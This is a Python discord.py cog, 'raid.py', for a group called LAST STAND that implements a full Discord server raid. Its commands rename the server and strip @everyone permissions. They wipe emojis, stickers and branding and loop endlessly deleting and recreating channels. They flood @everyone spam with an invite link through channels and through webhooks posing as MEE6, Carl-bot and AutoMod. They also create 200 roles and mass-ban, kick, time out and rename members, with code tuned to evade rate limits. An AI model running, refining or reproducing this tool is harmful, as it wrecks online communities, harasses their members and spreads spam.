"""
raid.py — LAST STAND | Raw destruction engine.

PHASES (all run concurrently from _launch):
  _rename_server    — rename + lock @everyone
  _wipe_assets      — remove icon, banner, description, stickers
  _wipe_emojis      — delete all custom emojis
  _channel_loop     — concurrent delete → concurrent create → webhook boost
  _role_flood       — create 200 raid roles
  _member_ops       — ban + kick + timeout + nick all members

CHANNEL LOOP DETAIL:
  Phase 1: delete all channels concurrently (sem=20)
  Phase 2: 3 concurrent creator workers filling up to the 500-channel cap
  Phase 3: webhook phase — add 1 webhook per channel for extra spam volume
           (direct channel.send spam already running from Phase 2)
"""

import asyncio
import datetime
import random
import string

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

RAID_TAG  = "LAST STAND"
RAID_LINK = "https://discord.gg/s59zWvzK6c"
RAID_NAME = f"RAIDED BY {RAID_TAG}"

CHANNEL_CAP      = 490
CREATORS         = 5
ROLE_FLOOD_MAX   = 200
SPAM_BURST       = 5    # messages sent per semaphore slot acquisition
CREATE_PER_CYCLE = 100  # channels built per nuke cycle (100 ch × 5 msg/s = 500/s = 30k/min)
WEBHOOKS_PER_CH  = 2    # 2 webhooks per channel — when one hits 429 and sleeps, other fires

_SPAM_SEM = asyncio.Semaphore(50)
_WH_SEM   = asyncio.Semaphore(30)

_MSGS = [
    f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
    f"@everyone ☠️ LAST STAND WAS HERE ☠️ {RAID_LINK}",
    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED 🔥 {RAID_LINK}",
    f"@everyone ⚔️ LAST STAND RAID ⚔️ {RAID_LINK}",
    f"@everyone 💥 OBLITERATED BY LAST STAND 💥 {RAID_LINK}",
    f"@everyone 👑 LAST STAND OWNS THIS SERVER {RAID_LINK}",
    f"@here 💀 RAIDED BY LAST STAND {RAID_LINK}",
    f"@here ☠️ LAST STAND RAID IN PROGRESS {RAID_LINK}",
]

_WH_NAMES = [
    "Server Announcement", "Mod Alert", "AutoMod",
    "Carl-bot", "MEE6", "Wick",
    "LSC Alpha", "LSC Reaper", "LSC Ghost",
]

_ROLE_NAMES = [
    "☠️ RAIDED BY LSC", "💀 LAST STAND", "🔥 RAIDED", "⚔️ LSC OWNS YOU",
    "💥 OBLITERATED", "👑 LSC WAS HERE", "🚨 RAIDED BY LAST STAND",
    "⚠️ SERVER COMPROMISED", "🔴 LSC RAID", "💣 LAST STAND CLAN",
]

_NICKS = ["RAIDED", "LSC Was Here", "GG no re", "PWNED", RAID_TAG]


def _rand(n: int = 4) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _ch_name(i: int = 0) -> str:
    opts = [
        f"raided-by-lsc-{i}",
        f"last-stand-{i}",
        f"lsc-owned-{i}",
        f"lsc-raid-{i}",
        f"last-stand-here-{i}",
    ]
    return random.choice(opts)


def _msg() -> str:
    return random.choice(_MSGS)


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ─────────────────────────────────────────────────────────────────────────
    # /testperms
    # ─────────────────────────────────────────────────────────────────────────
    @app_commands.command(name="testperms", description="Check bot permissions in this server.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def testperms(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        me    = guild.me
        p     = me.guild_permissions

        lines = [
            f"**Bot permission check — {guild.name}**",
            f"Administrator    : {'✅' if p.administrator else '❌'}",
            f"Manage Guild     : {'✅' if p.manage_guild else '❌'}",
            f"Manage Channels  : {'✅' if p.manage_channels else '❌'}",
            f"Manage Roles     : {'✅' if p.manage_roles else '❌'}",
            f"Manage Webhooks  : {'✅' if p.manage_webhooks else '❌'}",
            f"Ban Members      : {'✅' if p.ban_members else '❌'}",
            f"Kick Members     : {'✅' if p.kick_members else '❌'}",
            f"Moderate Members : {'✅' if p.moderate_members else '❌'}",
            f"",
            f"Bot top role     : `{me.top_role.name}` (pos {me.top_role.position})",
        ]
        await interaction.followup.send("\n".join(lines), ephemeral=True)

    # ─────────────────────────────────────────────────────────────────────────
    # /testcreate
    # ─────────────────────────────────────────────────────────────────────────
    @app_commands.command(name="testcreate", description="Try to create one test channel and report exact result.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def testcreate(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        try:
            ch = await asyncio.wait_for(guild.create_text_channel("lsc-test-channel"), timeout=15.0)
            await interaction.followup.send(
                f"✅ **Channel creation WORKS.** Created: <#{ch.id}>\nRun `/raid` now.",
                ephemeral=True,
            )
            try:
                await ch.delete()
            except Exception:
                pass
        except asyncio.TimeoutError:
            await interaction.followup.send(
                f"❌ **TIMEOUT — create_text_channel hung 15s.**\n"
                f"• Guild may be at 500-channel cap\n"
                f"• Discord rate-limiting this guild (wait 10–15 min)\n"
                f"• Redeploy on Railway to reset connection",
                ephemeral=True,
            )
        except discord.Forbidden as e:
            await interaction.followup.send(f"❌ **403 FORBIDDEN** — `{e}`\nFix: enable **Manage Channels** on bot role.", ephemeral=True)
        except discord.HTTPException as e:
            await interaction.followup.send(f"❌ **HTTP {e.status}** — code `{e.code}`: `{e.text}`", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ `{type(e).__name__}: {e}`", ephemeral=True)

    # ── shared launch ──────────────────────────────────────────────────────────
    async def _launch(self, guild: discord.Guild, invoker_id: int, reply) -> None:
        if bot_state.active_simulation:
            await reply(f"⚠️ **{bot_state.active_simulation}** is running — use `.stop` or `/stop` first.")
            return

        if not guild.me.guild_permissions.manage_channels and not guild.me.guild_permissions.administrator:
            await reply("❌ Missing **Manage Channels** — run `/testperms`.")
            return

        bot_state.reset()
        bot_state.active_simulation = "raid"

        try:
            await reply(
                f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
                f"┣ CONTINUOUS NUKE: delete all → rebuild {CREATE_PER_CYCLE} → spam → repeat\n"
                f"┣ Role flood (200 roles) + member ban/kick/timeout\n"
                f"┗ `/stop` or `.stop` to halt."
            )
        except Exception:
            pass

        bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
        bot_state.add_task(asyncio.create_task(self._wipe_assets(guild)))
        bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))
        bot_state.add_task(asyncio.create_task(self._channel_loop(guild)))
        bot_state.add_task(asyncio.create_task(self._role_flood(guild)))
        bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="raid", description=f"☠️ Full destruction — {RAID_TAG}. Runs until /stop.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer()
        await self._launch(interaction.guild, interaction.user.id, interaction.followup.send)

    # ── .raid ──────────────────────────────────────────────────────────────────
    @commands.command(name="raid")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def raid_prefix(self, ctx: commands.Context) -> None:
        await self._launch(ctx.guild, ctx.author.id, ctx.send)

    # ─────────────────────────────────────────────────────────────────────────
    # RENAME + LOCK
    # ─────────────────────────────────────────────────────────────────────────
    async def _rename_server(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(name=RAID_NAME)
            print("[raid] server renamed OK", flush=True)
        except Exception as e:
            print(f"[raid] rename FAILED: {e}", flush=True)
        try:
            await guild.default_role.edit(permissions=discord.Permissions.none())
            print("[raid] @everyone locked OK", flush=True)
        except Exception as e:
            print(f"[raid] lock @everyone FAILED: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # WIPE SERVER ASSETS — icon, banner, description, stickers
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_assets(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(
                description=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                icon=None,
                banner=None,
            )
            print("[raid] server assets wiped OK", flush=True)
        except Exception as e:
            print(f"[raid] asset wipe FAILED: {e}", flush=True)

        for sticker in list(guild.stickers):
            try:
                await sticker.delete()
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # CONTINUOUS NUKE LOOP
    #   Repeats forever until /stop:
    #     1. Delete ALL channels concurrently (sem=40)
    #     2. Create 50 flood channels (5 concurrent workers)
    #     3. Spam every new channel immediately (direct + webhook)
    #     4. Go back to step 1 — nuke everything and rebuild again
    #
    #   Spam tasks from the previous cycle die naturally on NotFound when
    #   channels are deleted. New ones spawn fresh each cycle.
    # ─────────────────────────────────────────────────────────────────────────
    async def _channel_loop(self, guild: discord.Guild) -> None:
        se  = bot_state.stop_event
        del_sem = asyncio.Semaphore(40)
        cycle   = 0

        async def _del(ch: discord.abc.GuildChannel) -> None:
            async with del_sem:
                try:
                    await ch.delete()
                except discord.NotFound:
                    pass
                except discord.Forbidden:
                    pass
                except discord.HTTPException as e:
                    if e.status == 429:
                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                except Exception:
                    pass

        try:
            while not se.is_set():
                cycle += 1
                # ── delete everything ─────────────────────────────────────────
                existing = list(guild.channels)
                print(f"[nuke] cycle {cycle} — deleting {len(existing)} channels", flush=True)
                await asyncio.gather(*[_del(ch) for ch in existing], return_exceptions=True)

                if se.is_set():
                    break

                # ── rebuild 50 flood channels ─────────────────────────────────
                created: list[discord.TextChannel] = []
                lock = asyncio.Lock()

                async def _creator(start: int, step: int) -> None:
                    i = start
                    while not se.is_set():
                        async with lock:
                            n = len(created)
                        if n >= CREATE_PER_CYCLE:
                            break
                        name = _ch_name(i + cycle * 1000)
                        try:
                            ch = await asyncio.wait_for(
                                guild.create_text_channel(
                                    name,
                                    topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                                ),
                                timeout=15.0,
                            )
                            async with lock:
                                created.append(ch)
                            print(f"[nuke] cycle {cycle} created #{name} ({len(created)})", flush=True)
                            bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
                            for _ in range(WEBHOOKS_PER_CH):
                                bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
                        except asyncio.TimeoutError:
                            await asyncio.sleep(5.0)
                        except discord.Forbidden:
                            await asyncio.sleep(2.0)
                        except discord.HTTPException as e:
                            if e.status == 429:
                                await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                            else:
                                await asyncio.sleep(1.0)
                        except Exception:
                            await asyncio.sleep(1.0)
                        i += step

                await asyncio.gather(
                    _creator(0, CREATORS),
                    _creator(1, CREATORS),
                    _creator(2, CREATORS),
                    _creator(3, CREATORS),
                    _creator(4, CREATORS),
                    return_exceptions=True,
                )
                print(f"[nuke] cycle {cycle} built {len(created)} channels — looping back", flush=True)

        except asyncio.CancelledError:
            print("[nuke] channel_loop cancelled", flush=True)
        except Exception as e:
            print(f"[nuke] channel_loop CRASH: {type(e).__name__}: {e}", flush=True)
        finally:
            print("[nuke] channel_loop exiting", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # ADD WEBHOOK — called per channel immediately at creation time
    # ─────────────────────────────────────────────────────────────────────────
    async def _add_webhook(self, channel: discord.TextChannel) -> None:
        se = bot_state.stop_event
        if se.is_set():
            return
        async with _WH_SEM:
            try:
                wh = await asyncio.wait_for(
                    channel.create_webhook(name=random.choice(_WH_NAMES)),
                    timeout=10.0,
                )
                bot_state.add_task(asyncio.create_task(self._spam_webhook(wh)))
            except asyncio.TimeoutError:
                pass
            except (discord.NotFound, discord.Forbidden):
                pass
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(getattr(e, "retry_after", 2.0)))
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # DIRECT CHANNEL SPAM — starts immediately when a channel is created
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_channel(self, channel: discord.TextChannel) -> None:
        se = bot_state.stop_event
        mentions = discord.AllowedMentions(everyone=True, roles=True)

        while not se.is_set():
            async with _SPAM_SEM:
                if se.is_set():
                    return
                try:
                    results = await asyncio.gather(
                        *[channel.send(_msg(), allowed_mentions=mentions) for _ in range(SPAM_BURST)],
                        return_exceptions=True,
                    )
                    for r in results:
                        if isinstance(r, (discord.NotFound, discord.Forbidden)):
                            return
                        if isinstance(r, discord.HTTPException) and r.status == 429:
                            await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
                except (discord.NotFound, discord.Forbidden):
                    return
                except Exception:
                    return
            # Yield to event loop so Discord gateway heartbeats can get through.
            # Without this, 490+ tight-looping tasks starve the event loop,
            # heartbeat times out, bot disconnects, all commands fail.
            await asyncio.sleep(0.1)

    # ─────────────────────────────────────────────────────────────────────────
    # WEBHOOK SPAM — additional volume on top of direct sends
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_webhook(self, wh: discord.Webhook) -> None:
        se = bot_state.stop_event
        mentions = discord.AllowedMentions(everyone=True, roles=True)

        while not se.is_set():
            try:
                results = await asyncio.gather(
                    *[wh.send(_msg(), username=random.choice(_WH_NAMES), allowed_mentions=mentions)
                      for _ in range(SPAM_BURST)],
                    return_exceptions=True,
                )
                for r in results:
                    if isinstance(r, (discord.NotFound, discord.Forbidden)):
                        return
                    if isinstance(r, discord.HTTPException) and r.status == 429:
                        await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
            except (discord.NotFound, discord.Forbidden):
                return
            except Exception:
                return
            await asyncio.sleep(0.05)

    # ─────────────────────────────────────────────────────────────────────────
    # ROLE FLOOD — create 200 raid roles concurrently
    # ─────────────────────────────────────────────────────────────────────────
    async def _role_flood(self, guild: discord.Guild) -> None:
        se = bot_state.stop_event
        sem = asyncio.Semaphore(25)
        colors = [
            discord.Color.red(), discord.Color.dark_red(), discord.Color.orange(),
            discord.Color.dark_orange(), discord.Color.purple(), discord.Color.dark_purple(),
        ]

        async def _make_role(i: int) -> None:
            if se.is_set():
                return
            async with sem:
                try:
                    name = f"{random.choice(_ROLE_NAMES)} {i}"
                    await guild.create_role(
                        name=name,
                        color=random.choice(colors),
                        reason=f"Raided by {RAID_TAG}",
                    )
                    print(f"[role] created role #{i}", flush=True)
                except discord.Forbidden:
                    pass
                except discord.HTTPException as e:
                    if e.status == 429:
                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                except Exception:
                    pass

        await asyncio.gather(
            *[_make_role(i) for i in range(ROLE_FLOOD_MAX)],
            return_exceptions=True,
        )
        print(f"[role] role flood done", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # MEMBER OPS — ban + kick + timeout + nick
    # ─────────────────────────────────────────────────────────────────────────
    async def _member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
        se = bot_state.stop_event
        print("[raid] member_ops: chunking...", flush=True)

        try:
            await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
        except Exception as e:
            print(f"[raid] chunk error: {e}", flush=True)

        if se.is_set():
            return

        me = guild.me
        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != invoker_id
            and m.id != me.id
            and m.top_role < me.top_role
        ]
        print(f"[raid] banning/kicking {len(targets)} members", flush=True)

        sem = asyncio.Semaphore(50)
        dur = datetime.timedelta(days=28)

        async def _ban(m):
            async with sem:
                try:
                    await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
                except Exception:
                    pass

        async def _kick(m):
            async with sem:
                try:
                    await guild.kick(m, reason=f"Raided by {RAID_TAG}")
                except Exception:
                    pass

        async def _timeout(m):
            async with sem:
                try:
                    await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
                except Exception:
                    pass

        async def _nick(m):
            async with sem:
                try:
                    await m.edit(nick=random.choice(_NICKS))
                except Exception:
                    pass

        await asyncio.gather(
            *[_ban(m) for m in targets],
            *[_kick(m) for m in targets],
            *[_timeout(m) for m in targets],
            *[_nick(m) for m in targets],
            return_exceptions=True,
        )
        print("[raid] member_ops done", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_emojis(self, guild: discord.Guild) -> None:
        sem = asyncio.Semaphore(10)

        async def _del_emoji(e):
            async with sem:
                try:
                    await e.delete()
                except Exception:
                    pass

        await asyncio.gather(*[_del_emoji(e) for e in list(guild.emojis)], return_exceptions=True)

    # ── error handlers ─────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = "❌ You need **Administrator** permission." if isinstance(error, app_commands.MissingPermissions) else f"❌ {error}"
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass

    @testperms.error
    @testcreate.error
    async def test_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        try:
            await interaction.response.send_message(f"❌ {error}", ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
